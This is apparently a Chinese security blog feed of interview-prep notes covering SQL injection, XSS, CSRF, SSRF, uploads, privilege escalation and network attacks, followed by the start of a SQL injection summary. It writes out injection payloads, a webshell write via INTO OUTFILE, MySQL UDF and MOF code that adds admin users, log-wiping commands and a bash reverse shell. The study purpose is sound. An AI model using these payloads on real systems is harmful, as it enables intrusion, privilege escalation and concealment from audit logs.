语句变为</p><pre><code>UPDATE user SET password=&#39;mypass&#39;, homepage=&#39;http://xxx.net&#39;, userlevel=&#39;3&#39; WHERE id=&#39;$id&#39;</code></pre><p>userlevel 为用户级别</p><p>b、修改 password 值为mypass)’ WHERE username=’admin’#</p><p>之后 SQL 语句变为</p><pre><code>UPDATE user SET password=&#39;MD5(mypass)&#39; WHERE username=&#39;admin&#39;#)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;$id&#39;</code></pre><p>c、修改 id 值为’ OR username=’admin’之后 SQL 语句变为</p><pre><code>UPDATE user SET password=&#39;MD5($password)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;&#39; OR username=&#39;admin&#39;</code></pre><h2 id="九、SQL如何写shell-单引被过滤怎么办"><a href="#九、SQL如何写shell-单引被过滤怎么办" class="headerlink" title="九、SQL如何写shell/单引被过滤怎么办"></a>九、SQL如何写shell/单引被过滤怎么办</h2><p>写shell: root权限，GPC关闭，知道文件路径 outfile函数</p><pre><code>http://127.0.0.1:81/sqli.php?id=1 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39; FIELDS TERMINATED BY &#39;&lt;?php phpinfo(); ?&gt;&#39;http://127.0.0.1:81/sqli.php?id=-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39;</code></pre><p>宽字节注入</p><h3 id="1、代替空格的方法"><a href="#1、代替空格的方法" class="headerlink" title="1、代替空格的方法"></a>1、代替空格的方法</h3><p>%0a、%0b、%a0 等<br>/**/ 等注释符<br>&lt;&gt;</p><h3 id="2、mysql的网站注入，5-0以上和5-0以下有什么区别"><a href="#2、mysql的网站注入，5-0以上和5-0以下有什么区别" class="headerlink" title="2、mysql的网站注入，5.0以上和5.0以下有什么区别"></a>2、mysql的网站注入，5.0以上和5.0以下有什么区别</h3><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p><p>5.0以下是多用户单操作，5.0以上是多用户多操做。</p><h2 id="十、XSS"><a href="#十、XSS" class="headerlink" title="十、XSS"></a>十、XSS</h2><p>1、XSS原理</p><p>反射型</p><p>用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。需要诱使用户“点击”一个恶意链接，才能攻击成功</p><p>存储型</p><p>存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。</p><p>DOM型</p><p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p><h3 id="2、DOM型和反射型的区别"><a href="#2、DOM型和反射型的区别" class="headerlink" title="2、DOM型和反射型的区别"></a>2、DOM型和反射型的区别</h3><p>反射型XSS：通过诱导用户点击，我们构造好的恶意payload才会触发的XSS。反射型XSS的检测我们在每次请求带payload的链接时页面应该是会带有特定的畸形数据的。DOM型：通过修改页面的DOM节点形成的XSS。DOM-based XSS由于是通过js代码进行dom操作产生的XSS，所以在请求的响应中我们甚至不一定会得到相应的畸形数据。根本区别在我看来是输出点的不同。</p><h3 id="3、DOM型和XSS自动化测试或人工测试"><a href="#3、DOM型和XSS自动化测试或人工测试" class="headerlink" title="3、DOM型和XSS自动化测试或人工测试"></a>3、DOM型和XSS自动化测试或人工测试</h3><p>人工测试思路：找到类似document.write、innerHTML赋值、outterHTML赋值、window.location操作、写javascript:后内容、eval、setTimeout 、setInterval 等直接执行之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经过安全函数。自动化测试参看道哥的博客，思路是从输入入手，观察变量传递的过程，最终检查是否有在危险函数输出，中途是否有经过安全函数。但是这样就需要有一个javascript解析器，否则会漏掉一些通过js执行带入的部分内容。</p><p>在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进行检测，对不同类型的XSS检测方式实际上并没有太过细分的标准化检测方式，所以回答的很烂。。。</p><h3 id="4、如何快速发现XSS位置"><a href="#4、如何快速发现XSS位置" class="headerlink" title="4、如何快速发现XSS位置"></a>4、如何快速发现XSS位置</h3><h3 id="5、对于XSS怎么修补建议"><a href="#5、对于XSS怎么修补建议" class="headerlink" title="5、对于XSS怎么修补建议"></a>5、对于XSS怎么修补建议</h3><p>输入点检查：对用户输入的数据进行合法性检查，使用filter过滤敏感字符或对进行编码转义，针对特定类型数据进行格式检查。针对输入点的检查最好放在服务器端实现。</p><p>输出点检查：对变量输出到HTML页面中时，对输出内容进行编码转义，输出在HTML中时，对其进行HTMLEncode，如果输出在Javascript脚本中时，对其进行JavascriptEncode。对使用JavascriptEncode的变量都放在引号中并转义危险字符，data部分就无法逃逸出引号外成为code的一部分。还可以使用更加严格的方法，对所有数字字母之外的字符都使用十六进制编码。此外，要注意在浏览器中，HTML的解析会优先于Javascript的解析，编码的方式也需要考虑清楚，针对不同的输出点，我们防御XSS的方法可能会不同，这点可能在之后的文章会做下总结。</p><p>除此之外，还有做HTTPOnly对Cookie劫持做限制。</p><h3 id="6、XSS蠕虫的生产条件"><a href="#6、XSS蠕虫的生产条件" class="headerlink" title="6、XSS蠕虫的生产条件"></a>6、XSS蠕虫的生产条件</h3><p>正常情况下，一个是产生XSS点的页面不属于self页面，用户之间产生交互行为的页面，都可能造成XSS Worm的产生。<br>不一定需要存储型XSS</p><h2 id="十一、CSRF"><a href="#十一、CSRF" class="headerlink" title="十一、CSRF"></a>十一、CSRF</h2><h3 id="1、CSRF原理"><a href="#1、CSRF原理" class="headerlink" title="1、CSRF原理"></a>1、CSRF原理</h3><p>CSRF是跨站请求伪造攻击，由客户端发起,是由于没有在关键操作执行时进行是否由用户自愿发起的确认</p><h3 id="2、防御"><a href="#2、防御" class="headerlink" title="2、防御"></a>2、防御</h3><p>验证Referer<br>添加token</p><h3 id="3、token和referer做横向对比，谁安全等级高？"><a href="#3、token和referer做横向对比，谁安全等级高？" class="headerlink" title="3、token和referer做横向对比，谁安全等级高？"></a>3、token和referer做横向对比，谁安全等级高？</h3><p>token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。并且FLASH一些版本中可以自定义referer。但是token的话，要保证其足够随机且不可泄露。(不可预测性原则)</p><h3 id="4、对referer的验证，从什么角度去做？如果做，怎么杜绝问题"><a href="#4、对referer的验证，从什么角度去做？如果做，怎么杜绝问题" class="headerlink" title="4、对referer的验证，从什么角度去做？如果做，怎么杜绝问题"></a>4、对referer的验证，从什么角度去做？如果做，怎么杜绝问题</h3><p>对header中的referer的验证，一个是空referer，一个是referer过滤或者检测不完善。为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。</p><h3 id="5、针对token-对token测试会注意哪方面被人，会对token的哪方面进行测试？"><a href="#5、针对token-对token测试会注意哪方面被人，会对token的哪方面进行测试？" class="headerlink" title="5、针对token,对token测试会注意哪方面被人，会对token的哪方面进行测试？"></a>5、针对token,对token测试会注意哪方面被人，会对token的哪方面进行测试？</h3><p>引用一段请教前辈的回答：</p><p>针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击<br>信息泄露有可能是缓存、日志、get，也有可能是利用跨站<br>很多跳转登录的都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了<br>另外也可以结合着其它业务来描述token的安全性及设计不好怎么被绕过比如抢红包业务之类的</p><h2 id="十一、SSRF"><a href="#十一、SSRF" class="headerlink" title="十一、SSRF"></a>十一、SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><h3 id="1、监测"><a href="#1、监测" class="headerlink" title="1、监测"></a>1、监测</h3><p>SSRF漏洞的验证方法：</p><p>1）因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞</p><p>2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞</a> 4[1]</p><h3 id="2、SSRF漏洞的成因-防御-绕过"><a href="#2、SSRF漏洞的成因-防御-绕过" class="headerlink" title="2、SSRF漏洞的成因 防御 绕过"></a>2、SSRF漏洞的成因 防御 绕过</h3><p>成因：模拟服务器对其他服务器资源进行请求，没有做合法性验证。利用：构造恶意内网IP做探测，或者使用其余所支持的协议对其余服务进行攻击。防御：禁止跳转，限制协议，内外网限制，URL限制。绕过：使用不同协议，针对IP，IP格式的绕过，针对URL，恶意URL增添其他字符，@之类的。301跳转+dns rebindding。</p><h2 id="十二、上传"><a href="#十二、上传" class="headerlink" title="十二、上传"></a>十二、上传</h2><h3 id="1、文件上传漏洞原理"><a href="#1、文件上传漏洞原理" class="headerlink" title="1、文件上传漏洞原理"></a>1、文件上传漏洞原理</h3><p>由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过其本身权限向服务器上传可执行的动态脚本文件</p><h3 id="2、常见的上传绕过方式"><a href="#2、常见的上传绕过方式" class="headerlink" title="2、常见的上传绕过方式"></a>2、常见的上传绕过方式</h3><p>前端js验证：禁用js/burp改包<br>大小写<br>双重后缀名<br>过滤绕过 pphphp-&gt;php</p><h3 id="3、防护"><a href="#3、防护" class="headerlink" title="3、防护"></a>3、防护</h3><p>文件上传目录设置为不可执行<br>使用白名单判断文件上传类型<br>用随机数改写文件名和路径</p><h3 id="4、审查上传点的元素有什么意义？"><a href="#4、审查上传点的元素有什么意义？" class="headerlink" title="4、审查上传点的元素有什么意义？"></a>4、审查上传点的元素有什么意义？</h3><p>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p><h2 id="十三、文件包含"><a href="#十三、文件包含" class="headerlink" title="十三、文件包含"></a>十三、文件包含</h2><h3 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h3><p>引入一段用户能控制的脚本或代码，并让服务器端执行 include()等函数通过动态变量的方式引入需要包含的文件；<br>用户能够控制该动态变量。</p><h3 id="2、导致文件包含的函数"><a href="#2、导致文件包含的函数" class="headerlink" title="2、导致文件包含的函数"></a>2、导致文件包含的函数</h3><p>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfile(), … JSP/Servlet：ava.io.File(), java.io.Fil-eReader(), … ASP：include file, include virtual,</p><h3 id="3、本地文件包含"><a href="#3、本地文件包含" class="headerlink" title="3、本地文件包含"></a>3、本地文件包含</h3><p>能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞</p><h2 id="十四、逻辑漏洞"><a href="#十四、逻辑漏洞" class="headerlink" title="十四、逻辑漏洞"></a>十四、逻辑漏洞</h2><h3 id="1、金融行业常见逻辑漏洞"><a href="#1、金融行业常见逻辑漏洞" class="headerlink" title="1、金融行业常见逻辑漏洞"></a>1、金融行业常见逻辑漏洞</h3><p>单针对金融业务的 主要是数据的篡改(涉及金融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅羊毛，交易/订单信息泄露，水平越权对别人的账户查看或恶意操作，交易或业务步骤绕过。</p><h2 id="十五、中间人攻击"><a href="#十五、中间人攻击" class="headerlink" title="十五、中间人攻击"></a>十五、中间人攻击</h2><p>中间人攻击是一个（缺乏）相互认证的攻击；由于客户端与服务器之间在SSL握手的过程中缺乏相互认证而造成的漏洞</p><p>防御中间人攻击的方案通常基于一下几种技术</p><p>1.公钥基础建设PKI 使用PKI相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例子中都是只验证服务器，这样就造成了SSL握手环节的漏洞，而如果使用相互认证的的话，基本可以更强力的相互认证</p><p>2.延迟测试</p><p>使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。</p><p>3.使用其他形式的密钥交换形式</p><h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>每台主机都有一个ARP缓存表，缓存表中记录了IP地址与MAC地址的对应关系，而局域网数据传输依靠的是MAC地址。在ARP缓存表机制存在一个缺陷，就是当请求主机收到ARP应答包后，不会去验证自己是否向对方主机发送过ARP请求包，就直接把这个返回包中的IP地址与MAC地址的对应关系保存进ARP缓存表中，如果原有相同IP对应关系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能</p><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><p>1.在主机绑定网关MAC与IP地址为静态（默认为动态），命令：arp -s 网关IP 网关MAC</p><p>2.在网关绑定主机MAC与IP地址</p><p>3.使用ARP防火墙</p><h2 id="十六、DDOS"><a href="#十六、DDOS" class="headerlink" title="十六、DDOS"></a>十六、DDOS</h2><h3 id="1、DDOS原理"><a href="#1、DDOS原理" class="headerlink" title="1、DDOS原理"></a>1、DDOS原理</h3><p>利用合理的请求造成资源过载，导致服务不可用</p><p>syn洪流的原理</p><p>伪造大量的源IP地址，分别向服务器端发送大量的SYN包，此时服务器端会返回SYN/ACK包，因为源地址是伪造的，所以伪造的IP并不会应答，服务器端没有收到伪造IP的回应，会重试3～5次并且等待一个SYNTime（一般为30秒至2分钟），如果超时则丢弃这个连接。攻击者大量发送这种伪造源地址的SYN请求，服务器端将会消耗非常多的资源（CPU和内存）来处理这种半连接，同时还要不断地对这些IP进行SYN+ACK重试。最后的结果是服务器无暇理睬正常的连接请求，导致拒绝服务。</p><p>CC攻击原理</p><p>对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务端资源的目的。</p><h3 id="2、DOSS防护"><a href="#2、DOSS防护" class="headerlink" title="2、DOSS防护"></a>2、DOSS防护</h3><p>SYN Cookie/SYN Proxy、safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个“Cookie”，并统计每个IP地址的访问频率。如果在短时间内收到大量的来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被丢弃。</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="十七、提权"><a href="#十七、提权" class="headerlink" title="十七、提权"></a>十七、提权</h2><h3 id="MySQL两种提权方式"><a href="#MySQL两种提权方式" class="headerlink" title="MySQL两种提权方式"></a>MySQL两种提权方式</h3><p>udf提权,mof提权</p><p>MySQL_UDF提取</p><p>要求: 1.目标系统是Windows(Win2000,XP,Win2003)；2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数 3.有root账号密码 导出udf: MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数 可以再mysql里输入select @@basedirshow variables like ‘%plugins%’ 寻找mysql安装路径 提权:</p><p>使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；</p><pre><code>create function cmdshell returns string soname ‘udf.dll’select cmdshell(‘net user arsch arsch /add’);select cmdshell(‘net localgroup administrators arsch /add’);drop function cmdshell;</code></pre><p>该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录即可。</p><p>MySQL mof提权</p><pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)instance of __EventFilter as $EventFilter&#123;EventNamespace = &quot;Root\\Cimv2&quot;;Name  = &quot;filtP2&quot;;Query = &quot;Select * From __InstanceModificationEvent &quot;&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;&quot;And TargetInstance.Second = 5&quot;;QueryLanguage = &quot;WQL&quot;;&#125;;instance of ActiveScriptEventConsumer as $Consumer&#123;Name = &quot;consPCSV2&quot;;ScriptingEngine = &quot;JScript&quot;;ScriptText =&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user waitalone waitalone.cn /add\&quot;)&quot;;&#125;;instance of __FilterToConsumerBinding&#123;Consumer   = $Consumer;Filter = $EventFilter;&#125;;</code></pre><p>其中的第18行的命令，上传前请自己更改。</p><p>2、执行load_file及into dumpfile把文件导出到正确的位置即可。</p><pre><code>select load file(&#39;c:/wmpub/nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mov&#39;</code></pre><p>执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。</p><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h2 id="十八、特殊漏洞"><a href="#十八、特殊漏洞" class="headerlink" title="十八、特殊漏洞"></a>十八、特殊漏洞</h2><p>1、Struts2-045</p><p>2、Redis未授权</p><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器</p><h3 id="利用条件和方法"><a href="#利用条件和方法" class="headerlink" title="利用条件和方法"></a>利用条件和方法</h3><h3 id="条件"><a href="#条件" class="headerlink" title="条件:"></a>条件:</h3><p>a、redis服务以root账户运行<br>b、redis无密码或弱密码进行认证<br>c、redis监听在0.0.0.0公网上</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法:"></a>方法:</h3><p>a、通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫<br>b、上传SSH公钥获得SSH登录权限<br>c、通过crontab反弹shell<br>d、slave主从模式利用</p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>密码验证<br>降权运行<br>限制ip/修改端口</p><p>3、Jenkins未授权访问</p><p>4、MongoDB未授权访问</p><p>攻击者通过未授权访问进入脚本命令执行界面执行攻击指令</p><p>println “ifconfig -a”.execute().text 执行一些系统命令,利用wget下载webshell</p><p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。</p><h3 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h3><p>为MongoDB添加认证：1)MongoDB启动时添加–auth参数 2)给MongoDB添加用户：use admin #使用admin库 db.addUser(“root”, “123456”) #添加用户名root密码123456的用户 db.auth(“root”,“123456”) #验证下是否添加成功，返回1说明成功 2、禁用HTTP和REST端口 MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface=false 3、限制绑定IP 启动时加入参数 –bind_ip 127.0.0.1 或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1</p><p>5、Memcache未授权访问</p><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>a、登录机器执行netstat -an |more命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。</p><p>b、telnet 11211，或nc -vv 11211，提示连接成功表示漏洞存在</p><h3 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h3><p>a、设置memchached只允许本地访问 b、禁止外网访问Memcached 11211端口 c、编译时加上–enable-sasl，启用SASL认证</p><p>6、FFMPEG本地文件读取</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>通过调用加密API将payload加密放入一个会被执行的段字节中。但是具体回答工程中我只回答道了SSRF老洞，m3u8头，偏移量，加密。</p><h2 id="十九、安全知识"><a href="#十九、安全知识" class="headerlink" title="十九、安全知识"></a>十九、安全知识</h2><h3 id="1、WEB"><a href="#1、WEB" class="headerlink" title="1、WEB"></a>1、WEB</h3><p>常见WEB开发JAVA框架</p><p>STRUTS,SPRING 常见的java框架漏洞 其实面试官问这个问题的时候我不太清楚他要问什么，我提到struts的045 048，java常见反序列化。045 错误处理引入了ognl表达式 048 封装action的过程中有一步调用getstackvalue递归获取ognl表达式 反序列化 操作对象，通过手段引入。apache common的反射机制、readobject的重写，其实具体的我也记不清楚。。。然后这部分就结束了</p><p>同源策略</p><p>同源策略限制不同源对当前document的属性内容进行读取或设置。不同源的区分：协议、域名、子域名、IP、端口，以上有不同时即不同源。</p><p>Jsonp安全攻防技术，怎么写Jsonp的攻击页面</p><p>涉及到Jsonp的安全攻防内容</p><p>JSON劫持、Callback可定义、JSONP内容可定义、Content-type不为json。</p><p>攻击页面</p><p>JSON劫持，跨域劫持敏感信息，页面类似于</p><p>function wooyun(v){<br>alert(v.username);<br>}</p><p>Content-type不正确情况下，JSONP和Callback内容可定义可造成XSS。JSONP和FLASH及其他的利用参照知道创宇的JSONP安全攻防技术。</p><h3 id="2、PHP"><a href="#2、PHP" class="headerlink" title="2、PHP"></a>2、PHP</h3><p>php中命令执行涉及到的函数</p><p>代码执行：eval()、assert()、popen()、system()、exec()、shell_exec()、passthru(),pcntl_exec(),call_user_func_array(),create_function()</p><p>文件读取：file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</p><p>命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()<br>安全模式下绕过php的disable fuction</p><p>DL函数，组件漏洞，环境变量。<br>PHP弱类型</p><p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p><p>0e开头的字符串等于0</p><h3 id="3、数据库"><a href="#3、数据库" class="headerlink" title="3、数据库"></a>3、数据库</h3><p>各种数据库文件存放的位置</p><pre><code>mysql:/usr/local/mysql/data/ C:\ProgramData\MySQL\MySQL Server 5.6\Data\oracle:$ORACLE_BASE/oradata/$ORACLE_SID/</code></pre><h3 id="4、系统"><a href="#4、系统" class="headerlink" title="4、系统"></a>4、系统</h3><p>如何清理日志</p><p>meterpreter: clearev<br>入侵 Linux 服务器后需要清除哪些日志？</p><p>web日志，如apache的access.log,error.log。直接将日志清除过于明显,一般使用sed进行定向清除</p><pre><code>e.g. sed -i -e ‘/192.169.1.1/d’</code></pre><p>history命令的清除，也是对~/.bash_history进行定向清除</p><p>wtmp日志的清除，/var/log/wtmp</p><p>登录日志清除 /var/log/secure<br>LINUX<br>查看当前端口连接的命令有哪些？netstat 和 ss 命令的区别和优缺点</p><pre><code>netstat -antp` `ss -l</code></pre><p>ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。<br>反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?</p><pre><code>bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1</code></pre><p>通过Linux系统的/proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？</p><pre><code>ls /proc</code></pre><p>系统信息，硬件信息，内核版本，加载的模块，进程<br>linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。</p><p>/etc/ssh/sshd___configiptables配置<br>如何一条命令查看文件内容最后一百行</p><pre><code>tail -n 100 filename</code></pre><p>Windows<br>如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。</p><h3 id="5、密码学"><a href="#5、密码学" class="headerlink" title="5、密码学"></a>5、密码学</h3><p>AES／DES的具体工作步骤<br>RSA算法</p><p>加密:<br>密文＝明文^EmodN</p><p>RSA加密是对明文的E次方后除以N后求余数的过程<br>公钥＝(E,N)</p><p>解密:<br>明文＝密文^DmodN 私钥＝(D,N)</p><p>三个参数n,e1,e2</p><p>n是两个大质数p,q的积<br>分组密码的加密模式<br>如何生成一个安全的随机数？</p><p>引用之前一个学长的答案，可以通过一些物理系统生成随机数，如电压的波动、磁盘磁头读/写时的寻道时间、空中电磁波的噪声等。<br>SSL握手过程</p><p>建立TCP连接、客户端发送SSL请求、服务端处理SSL请求、客户端发送公共密钥加密过的随机数据、服务端用私有密钥解密加密后的随机数据并协商暗号、服务端跟客户端利用暗号生成加密算法跟密钥key、之后正常通信。这部分本来是忘了的，但是之前看SSL Pinning的时候好像记了张图在脑子里，挣扎半天还是没敢确定，遂放弃。。。<br>对称加密与非对称加密的不同，分别用在哪些方面</p><h3 id="6、TCP-IP"><a href="#6、TCP-IP" class="headerlink" title="6、TCP/IP"></a>6、TCP/IP</h3><p>TCP三次握手的过程以及对应的状态转换</p><p>（1）客户端向服务器端发送一个SYN包，包含客户端使用的端口号和初始序列号x;<br>（2）服务器端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号xx1和服务器端的初始序列号y;<br>（3）客户端收到服务器端返回的SYNSACK报文后，向服务器端返回一个确认号为yy1、序号为xx1的ACK报文，一个标准的TCP连接完成。<br>TCP和UDP协议区别</p><p>tcp面向连接,udp面向报文 tcp对系统资源的要求多 udp结构简单 tcp保证数据完整性和顺序，udp不保证<br>https的建立过程</p><p>a、客户端发送请求到服务器端<br>b、服务器端返回证书和公开密钥，公开密钥作为证书的一部分而存在<br>c、客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端<br>d、服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端<br>e、客户端使用共享密钥解密数据<br>f、SSL加密建立</p><h3 id="7、流量分析"><a href="#7、流量分析" class="headerlink" title="7、流量分析"></a>7、流量分析</h3><p>wireshark简单的过滤规则</p><p>过滤ip:</p><p>过滤源ip地址:ip.src1.1.1.1;,目的ip地址:ip.dst1.1.1.1;</p><p>过滤端口:</p><p>过滤80端口:tcp.port80,源端口:tcp.srcport80,目的端口:tcp.dstport==80</p><p>协议过滤:</p><p>直接输入协议名即可,如http协议http</p><p>http模式过滤:</p><p>过滤get/post包http.request.mothod==”GET/POST”</p><h3 id="8、防火墙"><a href="#8、防火墙" class="headerlink" title="8、防火墙"></a>8、防火墙</h3><p>简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</p><p>本文转自网络，侵删。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入分享小结</title>
      <link href="/2020/08/08/sql/"/>
      <url>/2020/08/08/sql/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-SQL注入是什么？"><a href="#0x00-SQL注入是什么？" class="headerlink" title="0x00 SQL注入是什么？"></a>0x00 SQL注入是什么？</h2><p>SQL注入通过输入一些恶意的sql语句来修改后台数据库操作语句，执行注入语句已达到对数据库的增删改查（CRUD），甚至于数据库提权等。所以很多书籍或者机构的课程都会花较大篇幅去讲解SQL注入模块，学习SQL注入原理有利于后期的sqlmap以及waf绕过的学习。</p><span id="more"></span><h2 id="0x01-SQL注入的危害？"><a href="#0x01-SQL注入的危害？" class="headerlink" title="0x01 SQL注入的危害？"></a>0x01 SQL注入的危害？</h2><p>猜解后台数据库 ==》 这是利用最多的方式，通过猜解数据库，可盗取网站的敏感信息。</p><p>绕过验证      ==》 绕过验证登录网站后台</p><p>后台登陆语句：SELECT * FROM admin WHERE Username=’user’ and Password=’pass’</p><p>万能密码：’ or ‘1’=’1’ #</p><p>数据库提权    ==》注入可借助数据库的存储过程进行提权等操作</p><p>植马(即传入木马)，dos（造成拒绝服务攻击）</p><h2 id="0x02-SQL注入的基本流程"><a href="#0x02-SQL注入的基本流程" class="headerlink" title="0x02 SQL注入的基本流程"></a>0x02 SQL注入的基本流程</h2><blockquote><p>判断是否存在注入并判断是字符型还是数字型注入</p><p>判断查询列数，回显位置</p><p>获取数据库信息</p><p>破解加密数据</p><p>提升权限</p><p>内网渗透</p></blockquote><h2 id="0x03-SQL注入的分类"><a href="#0x03-SQL注入的分类" class="headerlink" title="0x03 SQL注入的分类"></a>0x03 SQL注入的分类</h2><h3 id="根据注入变量类型分类："><a href="#根据注入变量类型分类：" class="headerlink" title="根据注入变量类型分类："></a>根据注入变量类型分类：</h3><ul><li>数字型  ==》  <a href="http://127.0.0.1/sqli/Less-2/?id=1">http://127.0.0.1/sqli/Less-2/?id=1</a> and 1=2 –+</li><li>字符型  ==》  <a href="http://127.0.0.1/sqli/Less-1/?id=1&#39;">http://127.0.0.1/sqli/Less-1/?id=1&#39;</a> #   也可以 ?id=1’ and ‘1’=‘1 来闭合</li></ul><h3 id="根据注入请求方式分类："><a href="#根据注入请求方式分类：" class="headerlink" title="根据注入请求方式分类："></a>根据注入请求方式分类：</h3><ul><li>Get  方式  ==》 使用hackbar修改url，进行sql注入</li><li>POST 方式  ==》 可通过burpsuite抓包，修改post的数据进行传值的修改和sql注入</li></ul><h3 id="根据注入方式分类："><a href="#根据注入方式分类：" class="headerlink" title="根据注入方式分类："></a>根据注入方式分类：</h3><ul><li>联合查询注入 ==》 union操作符用于合并两个或多个select语句的结果集</li><li>报错型注入   ==》 即页面不会回显注入数据，只能通过页面报错来判断语句的正确与否</li><li>堆查询注入   